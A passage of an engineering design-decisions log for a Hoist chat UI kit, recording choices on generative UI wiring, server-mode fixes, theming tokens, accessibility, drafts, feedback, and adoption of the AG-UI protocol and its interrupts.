**Why.** `preview: true` does all that `approvalPreview` did, and `preview` also takes a function
of the input for a tool that renders no output of its own. Two options for one behavior split the
docs and the specs. D49 kept the alias only because another work package owned the docs.

**Alternatives.** Remove the alias at once. The kit has no release yet, but apps already build on
its snapshots, so a warning gives them a release to move.

## D54. Choices in the generative UI wiring of `ChatModel`

**Decision.** WP 7 step 1 wires a catalog into `ChatModel`, with these choices:

- The catalog's `modes` select its tools. A client-mode chat sends the component tools for
  `tools`, and the document tool for `document`. A server-mode chat adds the display tools for
  every mode. The modes also become the default of `toPrompt()` and `toToolSchemas()`, so the
  prompt and the tools agree.
- A catalog tool the app also lists in `tools`, as the same object, is added once. One that
  shares only its name with an app tool throws.
- Every chat has an artifact registry, with or without a catalog. A catalog with no `artifacts`
  config reads the chat's registry.
- `catalogVersion` is a field of `ChatRunRequest`, not a key in `runOptions`. `AgUiCodec` sends
  it in `forwardedProps` in server mode, beside the turn's ids. `runOptions` stays the user's
  choices, copied onto the user message. A retry then sends the current version, not the one of
  the first send.
- A reply records `metadata.catalogVersion` when its turn ends, if it calls a catalog tool, holds
  an `xh.chat.ui` data part, or has a component tag in its text. A document with no version of its
  own takes the version of its message, read untracked. A live reply uses the current catalog, so
  its renderers need not re-render when the version lands.
- A chat with a catalog renders `xh.chat.ui` data parts with no extra config. App data renderers
  take precedence.
- `AgUiCodec` sends the context of the turn's user message as a `context` entry, on each step of
  the turn. Earlier messages' context is not sent: a server-mode backend has seen it, and AG-UI
  has no field for it on a message. `AnthropicCodec` and `ChatCompletionsCodec` add a
  `<message-context>` block after the text of each user message with context, so the whole history
  keeps it.
- `ChatModel` has no `callToolAsync()`. A tool call that the model never made is not valid
  history: the model would see a result for a call it did not make. In server mode, the server
  owns the history and the tool loop, and the browser cannot add a call to it. The `callTool`
  action runs a client tool outside the history, as D47 says.

**Why.** Each keeps the contract of part 2 of `planning/GENUI.md`, and closes a gap that the wiring
leaves open.

**Alternatives.** Always send the document tool. Its schema is a union of every component, which
costs tokens on every step of a chat that never nests components.

## D55. Fixes from review 5 of server mode

**Decision.** Review 5 (`planning/reviews/review-5-server-mode.md`) led to these changes:

- A thread id given with `initialMessages` or `loadMessages()` is the backend's only if the
  messages hold a user message. A greeting alone is not history, so a new thread with a greeting
  still calls its thread creator and adopts the id from `RUN_STARTED`. This amends D39.
- The thread layer keeps a chat open while its turn waits for the user, and lists it in
  `awaitingThreadIds`. A closed chat would lose the question, and the store has no record of it.
- A delete of a thread whose create is in flight waits for the create, and deletes the backend's
  id too.
- In server mode, `AgUiCodec` sends only the client tool calls of a `continue` step, with their
  results. The server wrote the rest of the step and ran its own calls.
- `AnthropicCodec` puts live context at the end of the last user turn, after the history's
  breakpoint. `ChatCompletionsCodec` sends it as a last `user` message. In the system prompt, it
  came before the history, so each change voided the cached history. This replaces the placement
  of D49.
- Sends wait while an undo runs, so that a new turn's tools cannot act on what the undo restores.

**Why.** Each fixes a defect the review found. The scratch tests that confirmed them are now specs.

**Alternatives.** For live context, mid-conversation system messages. Not every gateway accepts a
system message after the first.

## D56. Fixes from review 5 of generative UI

**Decision.** Review 5 (`planning/reviews/review-5-genui-components.md`) led to these changes:

- The `context` of a `send` action is a flat object of at most 8 short values, such as record
  ids. The button's tooltip shows it, and the message view shows it under the sent message. The
  codecs send it to the model. This amends D17: the context is no longer hidden, so it cannot
  carry an instruction the user does not see.
- Component, handler, migration, artifact and data renderer names are looked up as own
  properties. A tag such as `<ui-constructor/>` is an unknown component.
- A tag attribute named `__proto__` fails, and every props schema must have `type: 'object'`.
- A catalog call that has a result but fails its props renders the fallback. A server's display
  tool answers before the browser checks, so the inline status cannot report the failure.
- A view applies only to the rows it gets. `ChatDataHandle.isComplete` says when the first page
  holds them all. `units` scales `number` columns, not `integer` ones.
- A stored tag for an older catalog runs through the migrations before it falls back. The parser
  keeps the name and props of a tag for an unknown component, so a migration can rename it.
- The catalog caches each component segment by its tag, so a tag keeps its props object while the
  text after it streams.
- A `callTool` action waits while the chat is busy, and refuses a tool whose schema the catalog
  cannot check fully. It keeps no undo, as the call is not in the history.
- Shared internal helpers live in the top-level `impl/`, so no package reaches into another's.

**Why.** Each fixes a defect the review found, or closes a gap between the code and its docs.

**Alternatives.** For the context, leave it out of the card's default schema. A button that acts
on a record then has to spell the record's id out in its text.

## D57. The kit is usable in layers

**Refined** by [D82](#d82-a-narrow-interface-needs-a-second-implementer) and
[D89](#d89-the-kit-is-built-from-swappable-subsystems).

**Decision.** Apps should be able to use the kit at four levels: building blocks alone, the engine
without the kit's UI, the kit's components over the app's own state, and the whole chat. Where a
component or model needs only part of `ChatModel`, it depends on a narrow interface that
`ChatModel` implements, rather than on the class. This is a design goal, weighed against cost, not
a rule that every part must meet.

**Why.** Teams may want one piece, such as the composer or a generative UI grid, without adopting
the whole conversation model. A hard dependency on `ChatModel` forces that adoption. A narrow
interface costs little when the coupling is small, and keeps the full chat working as before.

**Alternatives.** A separate headless package, or a runtime abstraction like those of other chat
kits. Both cost more than the reuse we know of today.

## D58. Design tokens replace the kit's theme variables

**Decision.** `styles/vars.scss` takes the design's tokens and drops the old names, with no
aliases. The kit is pre-1.0 (D26), so the changelog lists the renames as breaking.

- Every kit variable is `--xh-chat-*`, with no unprefixed hook. An app overrides one on
  `body.xh-app`, as with Hoist's own variables.
- A size or a time carries its unit in the value (`--xh-chat-turn-gap: 24px`). There are no
  unitless values with `-px` or `-ms` twins.
- Names follow Hoist's grammar, `--xh-chat-{element}-{state}-{property}`, with the property
  suffixes Hoist uses (`-bg`, `-text-color`, `-border-color`, `-gap`, `-padding`, `-font-size`).
- Values follow the specs: one 4px radius, a 1,100px column and a 640px prose cap, a 13px body,
  full `--xh-border-color` frames, and no shadows or literal colors.
- `--xh-chat-meta-text-color` is the one dark override, for contrast (A6).
- `.xh-chat--compact` sets the compact values on the variables components read directly, as one
  derived on `body` keeps the value computed there.
- Reads of Hoist's own variables use the names of the installed Hoist, such as `--xh-pad-px`,
  until the kit moves to the Hoist major with the new names. Hoist's codemod then migrates them.

**Why.** hoist-react's `css-var-simplify` branch, due in its next major, drops the unprefixed hooks
and the unitless values with `-px` twins. The kit follows that simpler model from the start, so
it has nothing to migrate when Hoist lands it. The handoff's hooks and twins copied the old Hoist
model.

**Alternatives.** The handoff's hooks and twins. They copy a model Hoist is about to retire.

## D59. Kit-wide settings live in `ChatKit.defaults`


**Decision.** `core/ChatKit.ts` exports `ChatKit`, a class with a `static defaults` object, as
`GridModel.defaults` and `FetchService.defaults` are in Hoist. An app sets fields at startup, in
its `AppModel` or `Bootstrap.ts`. A setting that belongs to one component sits in that component's
`defaults`, as with Hoist's `Button.defaults`. Instance config and props always win. Section 3
lists every setting and its home.

**Why.** A library has no app config of its own, and several settings span many components. Hoist's
`static defaults` pattern needs no service install and no server round trip, and Hoist developers
already know it.

**Alternatives.** Fields on `ChatService`. It is optional, it reads the backend config (D50), and a
chat without a backend still needs these settings. A soft config. It suits server-admin settings,
but icons and key bindings are code.

## D60. Reduced motion, with `reducedMotionSpinner`


**Decision.** Under `prefers-reduced-motion: reduce`, or inside an `.xh-chat--reduced-motion`
element, each moving cue in chat has a static twin: a solid caret, no shimmer, instant reveals,
and text that lands in whole lines at most 4 times a second. The ticking elapsed time and the
status words still show "busy". `ChatKit.defaults.reducedMotionSpinner` is `'static'` or `'spin'`,
default `'static'`. Static swaps Hoist's `Spinner` for a static hourglass icon inside chat only.
`'spin'` keeps Hoist's spinner.

**Why.** Anselm chose the static spinner (A1). Hoist's spinner ignores reduced motion on purpose,
because Citrix sessions often report it. The flag lets an app on Citrix keep Hoist's behavior.

## D61. The assistant icon and assistant profiles


**Decision.** `ChatKit.defaults.assistantIcon` is a function that returns the icon, default
`() => Icon.ai()`. A `ChatAssistantProfile` `{id, name, icon?, description?, status?}` overrides it
for one assistant. A component's `assistantIcon` prop overrides both. The reply header, the
empty state, the helper button and header, the workspace header and the launcher read it in that
order: prop, profile, kit default. A reply names its profile in `metadata.assistantId`, set from a
routing event when the backend sends one.

**Why.** Anselm chose sparkles, never the wand, and made it configurable (A5). The kit already names
the props `assistantName` and `assistantIcon`, and a second word for the same thing would split the
API (R15). A function returns a fresh element for each use.

## D62. A display status over the existing statuses


**Decision.** `ChatReplyStatus` is the display vocabulary: `idle`, `submitted`, `streaming`,
`recomposing`, `runningTool`, `paused`, `waitingToRetry`, `detached`, `stalled`, `interrupted`,
`cancelledByServer`, `error` and `aborted`. A pure function in `core/` derives it from a message,
its turn's activity time and the clock. `ChatStatus` and `ChatMessageStatus` do not change. Each
value has one icon, one label and one color in one desktop table.

- `interrupted` and `cancelledByServer` come from `RUN_ERROR` codes `interrupted` and `cancelled`,
  with the server's text as the reason.
- `waitingToRetry` is an error with `retryAfterSeconds` while its countdown runs.
- P6's `stopping` state is left out, as `stop()` takes effect at once (R3).

**Why.** The specs need a richer vocabulary than the model's lifecycle, but most of it is a reading
of state the model already holds. A derived value keeps the model's statuses small, and a pure
function is easy to test against P6's matrix.

**Alternatives.** Add the states to `ChatMessageStatus`. Stored history would then hold clock
states such as `stalled`.

## D63. Stalled is a soft state before D34's hard timeout


**Decision.** A reply is `stalled` after `ChatKit.defaults.stallAfterMs` (30 s) with no bytes,
heartbeats included. Its spinner and caret give way to "No response for 30s" in place, the status
region offers Refresh Status where it can (R1), and Stop stays. The next byte clears it with no
notice. With heartbeats but no events, a timeline shows P2's quiet state, which keeps its spinner.
D34's `idleTimeout` stays the hard failure and must be longer than `stallAfterMs`. A transport
reports each byte it reads, decoded or not, through a new activity callback on the step, so the
model sees heartbeats that never decode.

**Why.** Slow is not broken. A soft state tells the user early without ending a run that may still
answer. Today a heartbeat resets the transport's timer but never reaches the model.

## D64. A failure shows inline, and the next action sits above the composer


**Decision.** The inline failed row in the reply records what happened, with Edit Prompt and Copy
Details. The composer's status region holds the thread's one next action. `ChatErrorBanner`, an
internal component, goes. A body-wide error uses Hoist's `ErrorMessage`.

- "Try Again" resends a turn. "Retry" re-fetches a part.
- A failure is retry-safe unless `RUN_ERROR.metadata.retrySafe` is false. In server mode, the kit's
  own `stalled` and `incomplete-stream` errors are not retry-safe. This amends D34 and D44 for
  server mode.
- A failure that is not retry-safe offers Refresh Status, which calls
  `ChatThreadsModel.reloadThreadAsync()`. Without a thread layer it offers Try Again with "It may
  still be running".
- A retry-safe error with `retryAfterSeconds` counts down and retries at zero, with Cancel.
- The model records feedback and undo failures in observables, and shows no toasts. Components
  render them inline.

**Why.** A failure shows once, at the smallest scope that holds it (P6). A resend that could run a
write twice needs the server's word that it is safe. A client-mode chat keeps its Try Again (R1).

## D65. One announcer for the chat


**Decision.** The message list is `role="log"` with `aria-live="off"`. A kit announcer renders two
hidden live regions, one polite and one assertive. The announcer reads a finished reply once: the
assistant, its tool count and time, then its first paragraph, cut at 300 characters. Polite
announcements wait at least 2 s apart and coalesce. Assertive ones never wait. Tokens, verb
changes, elapsed ticks and countdown seconds are never announced. A step that fails while a reply
runs is announced. Steps that succeed are not.

**Why.** A live region on the list reads every token. One announcer keeps announcements spaced and
in order across the list, the timeline and the composer.

Amended by item 1 of `planning/AG-UI.md`: the `announceSteps` setting, with its "Step N done"
mode, is gone.

## D66. The keyboard map, configurable


**Decision.** `ChatKit.defaults.shortcuts` maps each action to a key combo, in the format of Hoist's
`useHotkeys`, or to null to drop it:

| Action | Default | Scope |
|---|---|---|
| `newChat` | `mod+shift+o` | Workspace or dock |
| `toggleDock` | `ctrl+.` | Page-wide, only while a dock exists |
| `openHelper` | `mod+i` | Focus inside a component with a helper |
| `focusComposer` | `/` | Focus outside a text field |
| `cycleRegions` | `f6`, Shift+F6 back | Workspace, dock or helper |
| `toggleSidebar` | null | Workspace |

Esc does one thing per press, scoped to the region with focus (H4). No shortcut ever approves,
applies or deletes.

**Why.** Browsers bind some of these keys, so each needs a remap or a way out (B3). Hoist's hotkeys
register keys but offer apps no remap, so the kit owns the map (H5).

## D67. Drafts persist in local storage


**Decision.** The composer saves its draft text per thread, after each 500 ms pause, through
`XH.localStorageService`, which keys by app and user. Attachments stay in memory only. A restored
draft shows "Draft from 10:31 restored" with Discard. The draft goes when its message sends.
`ChatKit.defaults.drafts` is `'local'` or `'memory'`, default `'local'`. `ChatKit.clearLocalData()`
removes every kit key. Hoist has no logout hook, so an app calls it from its logout.

**Why.** A draft that survives a reload is the expected behavior (B6). Attachments are base64 in
memory, too large for local storage and too sensitive to leave on disk.

**Alternatives.** Server drafts. They follow the user across machines, but need a store method
that no backend offers.

## D68. The side panel is a request seam, with no viewer in the kit


**Decision.** `ChatSidePanelModel` holds one open request at a time. A request is a discriminated
union: `{type: 'document', source, page?, passage?, citation?}`, `{type: 'table', artifactId,
view}` or `{type: 'chart', artifactId, view}`. Opening one replaces the last, and Back returns
focus to the element that opened it. Components reach it through `ChatSidePanelHost`, a narrow
interface. The kit renders tables and charts. An app supplies `documentRenderer` for documents.
Without one, or without room (788 px, P3), a document opens in a new tab with a toast. With no side
panel, a table opens in a dialog (`GENUI.md` 2.5).

**Why.** A document viewer will land in hoist-react (A3). The kit owns only the chat side: the slot,
the request and Back.

## D69. A result table renders a preview inline and the Grid in the side panel


**Decision.** `chatUiGrid` keeps its name and spec. Inline, it renders a plain HTML table of at most
8 rows and 6 columns, on Hoist's compact grid tokens. The footer always states what is hidden. View
Full Table opens one Hoist `Grid` in the side panel (D68), paged from the `ChatDataSource`. A result
that fits the preview gets no full tier. `ChatUiGrid.defaults` holds `previewRows`,
`previewColumns`, `pageSize` and `exportConfirmAbove`. `ChatUiChart.defaults` holds
`maxInlineSeries` and `maxInlinePoints`. This replaces the inline grid of `GENUI.md` 2.5.

**Why.** A long thread with many ag-Grid instances is heavy, and B1 makes the preview the inline
tier. Keeping the names keeps app catalogs working.

## D70. Feedback reasons and the inline form


**Decision.** `ChatFeedbackConfig` gains `reasons?: string[]`, the optional toggles of the form, and
`ChatFeedbackSpec` gains `reasons?: string[]`. The comment form opens inline under the action bar,
never in a popover. With `requireComment`, a rating saves only with its comment. Without it, a
rating saves at once and the comment follows as an update. `commentOn` and `requireComment` keep
their defaults (R5). After a reload the rating comes back, and the comment and reasons do not.

**Why.** P6's form holds required text, an error state and a 380 px layout, which a popover cannot
keep through an outside click. Comment rules depend on the backend, so they stay config.

## D71. Suggestions fill the composer


**Decision.** An empty-state suggestion fills the composer and never sends. Suggestions hide once
the input has text. Follow-up chips on a reply still send, with D17's tooltip.

**Why.** The user reads and can edit a prompt before it goes. A follow-up belongs to one reply and
is a quick action, so it keeps its one click.

## D72. Source kinds, favicons and fixed no-answer replies


**Decision.** `ChatSourcePart` gains `sourceType: 'url' | 'document'`, default `'url'` when the part
has a URL. A document marker opens the side panel (D68). A URL marker pins its hover card. A
favicon in `metadata.favicon` follows the image policy (R9). The sources list follows marker order
and never renumbers (R19). A `data` part with `dataType` `xh.chat.noAnswer` renders the fixed
"not found" template, with no sources list and no Regenerate.

**Why.** Each keeps the part model of D2 and the image policy of D16, and gives P3 what it needs to
tell sources apart.

## D73. Helpers extend tool groups

**Withdrawn** by [D80](#d80-component-helpers-leave-the-kit-for-v1).


**Decision.** `ChatToolGroup` gains optional members for the helper UI: `title`, `boundary()` for
the data boundary line, `isChangedSince(snapshot)` to retire Undo, `highlight(targets)` for the
change flash, and `docs`, the only pages an answer may cite. A helper's conversation lives in
memory for the life of its component (A2). `ChatAssistantModel` owns the chat. A desktop button and
a container dock inside the component at 740 px or wider, else open as a popover. A tool that
removes something asks first (R11). Several changes from one turn share one card and one Undo,
under D48.

**Why.** Tool groups already hold the tools, the context and the undo (D48, D51). Optional members
add what P7 draws, with no second adapter type.

## D74. Thread list additions


**Decision.** `ChatThreadSummary` gains `lastRunEnd?: 'complete' | 'interrupted' | 'failed'` and
`lastRunReason?`. The thread layer tracks "finished away" per session. A store declares whether its
search covers message text, with `searchesMessages`, and returns `snippet` per match. Otherwise
the list says "Searching titles". A route-selected thread that the store reports missing is "not
found" (R14). Sidebar width and its collapsed state persist through `persistWith`.

**Why.** Each row state in P5 needs one field the summary lacks. Search falls back to titles
(`02-backend-capabilities.md` row 7).

**Update.** The store's `searchesMessages`, the summary's `snippet` and "Searching titles" shipped
after review 6. The thread list is a one-level tree grid rather than a listbox, as its rows hold
buttons. "Thread not found" waits on the threads model learning that a store reported a thread
missing. It is marked `TODO(R14, D74)` in `ChatWorkspace`.

## D75. Small API additions the specs need


**Decision.**

- `approveToolCallAsync(id, reason?)`, as `denyToolCallAsync()` already takes one (P2).
- `ChatModelConfig.dataRefreshedAt`, a function that returns the app's last data refresh, for the
  stale reply warning (P1, `02-backend-capabilities.md` row 15).
- The reducer flags a text part that `xh.chat.textReplace` shortened, so the view can hold the old
  text as "Revising" (P6).
- `ChatComposerHost` gains optional members for the status region (D64).

**Why.** Each fills a gap between the specs and the model, without a change to an existing
contract.

## D76. The design reconciliation is adopted, with the owner to confirm

**Decision.** The design handoff in `.tmp/design-handoff/` is the authority on visual design and
interaction, not on implementation, API shape or core behavior. `planning/design-reconciliation.md`
lists 28 conflicts between the handoff and the repo, or within the handoff, each with a
recommended resolution. The build follows every recommendation (R1 to R20, H1 to H8), and D58 to
D75 record the ones that change the API or conventions. Anselm confirms or changes them after the
fact. A change to one updates the matching decision.

**Why.** The owner asked for progress while away, with the design brief used as guidance and the
repo in charge of code. Each recommendation keeps a repo contract unless the design is clearly
better for users.


## D77. Feedback settings for strict backends, and Allow for approvals

**Decision.** `ChatFeedbackConfig` gains `clearable` (default true) and `maxCommentLength` (default
1,000). With `clearable` false, the kit offers no way to clear a rating, and
`submitFeedbackAsync()` throws for a null one. A failed submit that the server rejects (HTTP 400,
413 or 422) shows the server's message with no Retry; any other failure keeps the comment and
offers Retry. Approval buttons read Allow and Deny, Allow first, each with an optional reason.

**Why.** Real feedback backends differ: one cannot clear a rating, and one cuts comments at its
own length. A retry of a rejected comment would fail the same way. Allow and Deny match the
design's approval controls (P6).

## D78. Choices in the activity timeline

**Decision.** `ChatToolSpec.display` takes the full D23 enum: `card` (default), `inline`,
`timeline`, `answer`, `pinned` and `hidden`. `timeline` calls and sub-agent parts form one
timeline block per run of them. Text and reasoning fold into the block only when another
timeline call follows. A `card`, `inline` or `answer` call ends the block. Sub-agents are modeled
minimally: AG-UI `SUBAGENT_STARTED` becomes a data part of type `xh.chat.subagent`, keyed by its
run id, that `SUBAGENT_FINISHED` and `SUBAGENT_ERROR` close, and a tool call carries the
`subagentRunId` it belongs to. A call made by a sub-agent defaults to `timeline`. Tool call parts
record `startedAt` and `endedAt` for durations. Where the spec leaves a rule open, the kit counts
a later call with the same tool, input and sub-agent as a retry, and applies the narrow layout
below 480px. Reconnect markers, server stages and server narration marks wait for a transport
`reconnect` and backend signals.

**Why.** It builds P2 on events AG-UI already defines, with no backend capability the kit cannot
see. The approval and question panels are shared with the tool call card, and the composer's
status region announces a paused turn, so the timeline does not announce it again (D65).

## D79. Choices in the component helper

**Withdrawn** by [D80](#d80-component-helpers-leave-the-kit-for-v1).

**Decision.** `ChatAssistantModel` (in `assist/`) owns one in-memory `ChatModel` for a component,
built from one or more tool groups, with a system prompt that keeps the helper to its component
and its `docs`. Its conversation lives and dies with the component (A2). Without a transport it
uses `XH.chatService.createTransport()`, and with no backend the button does not render.
`ChatToolGroup` gains optional `title`, `kind`, `intro`, `boundary()`, `snapshot()`,
`isChangedSince()`, `highlight()` and `docs` (D73 plus `snapshot`, which `isChangedSince` needs).
`chatToolResult()` takes `targets`, the parts of the component a call changed, for Show and the
change flash. A reply's Undo retires once `isChangedSince()` reports a hand edit, through a
`ChatUndoGuard` found in model context. Change lines are one line per call, and Undo stays in the
reply's action bar under D48. The desktop container docks the helper in the component at 740px
or wider, and opens a popover below that. Only one popover helper is open per page. Removals ask
first, and `views` is no longer a default capability (R11).

**Why.** It reuses the tool groups, context providers and undo the kit already has (D48, D51),
and keeps `assist/` platform-neutral. One line per call keeps D48's single undoable reply exact.

**Alternatives.** P7's framed change card with its own Undo. It would need changes to the model
and the timeline for a second undo path.

## D80. Component helpers leave the kit for v1

**Decision.** The kit ships no component helper. `assist/`, `desktop/assist/` and
`desktop/cmp/assist/` are removed: `ChatAssistantModel`, `ChatToolGroup`, `gridTools`,
`dashCanvasTools`, the helper's button, container and data boundary line, and the
`--xh-chat-helper-*` and `--xh-chat-boundary-*` variables. The core seams only a helper used go
too: `targets` on `chatToolResult()`, `ChatUndoGuard` and the `openHelper` shortcut. This
withdraws D51, D73 and D79. The general seams stay: client tools, approvals, inline tool display,
context providers, per-tool undo and `undoTurnAsync()` (D48, D49).

**Why.** The helper was a use case to test the kit's primitives against, not a v1 deliverable.
The build showed that an app can make one from the primitives that stay. The code is kept on the
`archive/helpers` branch, with its plan, `planning/HELPERS.md`.

## D81. `ChatService` leaves the kit

**Decision.** The kit ships no `ChatService` and reads no `chatConfig` soft config. `svc/` is
removed. This withdraws D50 and the service half of D24. `ChatCompletionsCodec` stays.

**Why.** Its only caller was the component helper, removed by D80. An app builds its transport
in a line or two, with the codec its server relays.

## D82. A narrow interface needs a second implementer

**Refined** by [D89](#d89-the-kit-is-built-from-swappable-subsystems).

**Decision.** This refines D57. A component depends on a narrow interface only where a second
implementer really exists. Otherwise it takes `ChatModel`. By that test, the four host
interfaces come out as follows.

- `ChatComposerHost` stays, trimmed to `isBusy`, `sendAsync`, `messages` and
  `sendBlockedReason`. A prompt box that sends elsewhere, such as an app's "Ask the assistant"
  search, is a real second implementer.
- `ChatThreadListHost` stays by judgment, not by the test. `ChatThreadsModel` is its only
  implementer today. An inbox-like list over the app's own threads is a likely second, and the
  interface is cheap to keep. Revisit it if none appears.
- `ChatSidePanelHost` stays. It is a request-dispatch seam that a workspace or an app's own panel
  can implement.
- `ChatMessageListHost` gives way to `ChatTranscript`: `messages`, `dataRenderers` and `catalog`.
  Its only implementer was `ChatModel`. Streaming, approvals, feedback and undo need the turn
  loop, so the one real second case is a read-only transcript, such as an admin's chat log.
  Interactive children take the `ChatModel`, and show only when the host is one - see
  `isChatModel()`.

`createChatRunRequest()` and the public `ChatStreamReducer` stay. They are the headless engine
layer, with real uses in tests and services.

**Why.** `ChatMessageListHost` had about 25 members, nearly all optional, and one implementer. Its
children guarded each action with `host.x?.()` before they could act. An interface that nothing
else implements costs its readers and buys no reuse.

**Next.** `ChatModel` has about 1,960 lines and 87 public members. Split it into managed
sub-models - feedback, undo, the server-mode run lifecycle and thread binding - that components
bind with `uses()`, the way `GridModel` composes its parts. That gives the layers real seams
without more host interfaces. It is a large refactor that the first integration does not need,
so it waits until that integration ships, unless the integration shows a concrete need first.

**Alternatives.** Keep `ChatMessageListHost` for symmetry with the other hosts. It would keep the
guards, and the optional members no app implements.

## D83. Edit and Regenerate can be turned off

**Decision.** `ChatModel` gains `@bindable` `allowEdit` and `allowRegenerate`, default true from
config. While false, the message views hide Edit, Edit Prompt and Edit Question, or Regenerate,
and `editMessageAsync()` or `regenerateAsync()` logs a warning and does nothing. Try Again and
`retryAsync()` are unchanged.

**Why.** An agent service whose history only grows cannot re-run from an edited message or replace
a reply. The first integration's backend is one: it only appends to a session. The settings are
bindable, so an app can change them per agent.

**Alternatives.** Flags on `ChatThreadStore` that the threads model applies to each chat. An app
already sets both in `createChatModel`, so the flags would add surface for no new capability.

## D84. Build on the official AG-UI packages at the protocol layer

**Decision.** The kit takes its AG-UI event and request types from `@ag-ui/core`. `AgUiCodec`
runs `@ag-ui/client`'s enforcement, chunk expansion and sequence verification on every AG-UI
stream, with no switch to turn them off. A malformed stream fails the turn, as AG-UI 1.0
requires. RxJS, which the checks need, stays inside one internal module. The kit keeps its own
message model, reducer and Hoist-integrated transports. It does not let the client's agent
classes own a conversation, and does not use `HttpAgent`. The interrupt and shared state work
uses the client's interrupt helpers and its JSON Patch support. The official conformance suite
runs in CI. This supersedes D4's choice of no runtime dependency.

**Why.** Hoist builds on curated libraries, and writes its own only with good reason. The checks
hold about 3,000 lines of spec logic that the official TypeScript client maintains and the
conformance suite tests. A spike, recorded in `planning/AG-UI.md`, measured them:

- They raised the kit from 30 to 51 of the 61 conformance fixtures that apply to it.
- They cost about 11 ms for a 2,000-token reply, and 63 KB gzipped, a small share of a Hoist app.
- They fit inside the codec's decoder, with no change to the transports or the API.

The client's agent classes deep-copy their message list on every event, which cost 0.2 to 1.1
seconds per reply on long threads. Their plain messages also cannot carry the kit's parts.
Front ends outside CopilotKit make the same split: the official types and checks, with their own
message handling.

**Costs.** RxJS and a copy of Zod 3 in app bundles, until upstream moves to Zod 4. Upgrades on
CopilotKit's release cadence. The checks warn through the console, not Hoist's logging.

**Alternatives.** Keep the kit's own handling, and track the spec by hand with the suite as a
check. Take only the types, as TanStack AI does, which leaves the strictness rules to write.

## D85. AG-UI requests carry the whole history the chat holds

**Decision.** `AgUiCodec` sends every message the chat holds as `messages`, in both history
modes. A request that carries only the new messages becomes an opt-in, which the docs mark as
outside the spec, for a backend that needs it. A tool result always travels with the assistant
message that called the tool. This amends D19 for AG-UI requests.

**Why.** AG-UI 1.0 says the agent "MUST treat it as the complete history it is being shown", and
has no delta mode. Adapters that keep state, such as LangGraph, ADK and Mastra, merge by message
id, so the whole history works with them. Adapters that keep none, the default for Pydantic AI
and Microsoft Agent Framework, lose all context when sent only the new messages. CopilotKit sends
the whole thread. Mastra calls a tool again if its result arrives without the call. Upstream
issues ask for a delta mode, with no ruling yet.

**Cost.** Larger requests on long threads. A paged thread sends only the pages it has loaded.

## D86. Interrupts use standard AG-UI only

**Decision.** A server agent asks the user a question, or asks to run a tool, through the AG-UI
1.0 `interrupt` outcome on `RUN_FINISHED`. The kit answers in the next run's `resume` list. The
`xh.chat.interrupt` event of D29 is dropped. A LangGraph agent turns on its adapter's
`emitInterruptOutcome` setting. The kit renders a `responseSchema` that is a flat object of
simple fields as a Hoist form, and offers Decline for any other schema. A question with no schema
gets a text box. A new message declines the open questions. The full design is in
`planning/AG-UI.md`. This amends D29.

**Why.** The interrupt outcome is standard AG-UI 1.0, and the official client has helpers for it.
Any backend that can send a custom event can send the standard outcome as easily, so the kit's own
event bought nothing. LangGraph's legacy channel is undocumented. AG-UI leaves the answer schema
unbounded, so which schemas render as a form is the kit's call.


## D87. Choices in the AG-UI protocol layer

**Decision.** The kit's event types extend the official `@ag-ui/core` types. Each widens `type`
from the enum member to its string, so app code that writes `{type: 'RUN_STARTED'}` compiles.
`AgUiCodec` checks each request with the client's `enforceOutgoingInput()` as well as each stream.
A rejected stream fails the turn with a `ChatRunError` coded `invalid-stream`, and a rejected
request with one coded `invalid-request`. A thrown `ChatRunError` records its code on the reply.
In server mode, `invalid-stream` is not retry-safe. The chat reads a stream to its end after
`RUN_ERROR`, and a `RUN_STARTED` after the error starts a new run that clears it. Text and reasoning parts keep the server's
AG-UI message id as `serverId`, and tool calls keep `parentServerId` and `resultServerId`.
`AgUiCodec` sends each message back with the server's id, grouped as the official client
assembles them. A tool call with no parent id joins the step's last assistant message, as the
kit grouped calls before. The opt-in for new messages only is `AgUiCodecConfig.newMessagesOnly`,
for server mode. The conformance suite runs in `pnpm test`, against a committed list of gaps.

**Why.** Apps tell failures apart by code, and AG-UI separates a client's rejection from a run's
own error. A rejected stream is a backend bug, so Hoist still reports it. Under D85, an adapter
that merges by id, such as LangGraph's, would add duplicates if the kit sent its own ids for
server messages. The message ids, item 5 of `planning/AG-UI.md`, came
forward for that reason. The official client gives a call with no parent id a message of its
own. No fixture covers that case, and keeping the call with its text suits the model APIs that
stateless adapters relay to.

## D88. Choices in AG-UI interrupts

**Decision.** `ChatModel` holds the thread's open interrupts, as the official client's
`pendingInterrupts` does. Each interrupt outcome replaces the set, and any other `RUN_FINISHED`
clears it. Every request on the thread covers the set until a run that carried it finishes. A new
turn or a stop declines what has no response, and a stopped resume declines its answers too. The
user answers with `answerInterrupt()` and `declineInterrupt()`, and sends with
`submitInterruptsAsync()`. A lone question submits as soon as it is answered. Several end in a
review step. The request field is `resume`, after AG-UI, and the reserved reattach method is
`ChatTransport.reconnect()`. A server call an interrupted run leaves open is marked
`awaitsResume`, never gets a result from the chat, and goes back with no tool message. An
approval follows the shape its `responseSchema` asks for, or sends `{approved}`. The answer form
covers a flat object of simple fields, a string enum and a boolean, after reading Pydantic's
local `$ref`s and nullable fields. The full design is in `planning/INTERRUPTS.md`. This builds on
D86.

**Why.** AG-UI requires the next run to cover every interrupt of the last interrupted run.
Retry and regenerate discard the reply that raised them, so the set cannot live only on the reply.
Adapters disagree on how to approve, so the schema decides. A server call with a result from the
chat would contradict the server's own record. A waiting sub-agent ends as `error` when its reply
closes, so the timeline never shows it waiting forever.

## D89. The kit is built from swappable subsystems

**Decision.** This refines D57 and D82. The kit is a set of subsystems. Each one is a complete
component and model pair: threads (`ChatThreadsModel` and `chatThreadList`), the conversation
(`ChatModel` and `chatPanel`), the side panel (`ChatSidePanelModel` and `chatSidePanel`), and the
workspace that composes them. The built-ins fit each other with no setup. The seams sit between
subsystems, each a small contract that the built-in meets. An app can swap one subsystem for a
model of its own and keep the rest. No interface sits inside a subsystem, and none mirrors a
whole class.

Two seams follow from this:

- **Threads and the active chat.** `ChatThreadsModel` talks to the chat of the open thread through
  a contract of about five members: the thread it shows, whether a reply runs, whether it waits on
  the user, load a thread's history, and detach. `ChatModel` meets it. The wiring that the threads
  model now pushes into `ChatModel` (feedback, the status refresh, scope and drafts per thread)
  moves into `ChatModel`'s own thread binding, the sub-model D82 planned.
- **The workspace and the conversation view.** `ChatWorkspace` takes the app's own conversation
  view in place of `chatPanel`.

`ChatThreadListHost` goes. The thread list and `ChatThreadsModel` are a pair, and the swap point is
the chat behind the model, not the model behind the list. `ChatSidePanelHost` stays, as the side
panel's seam.

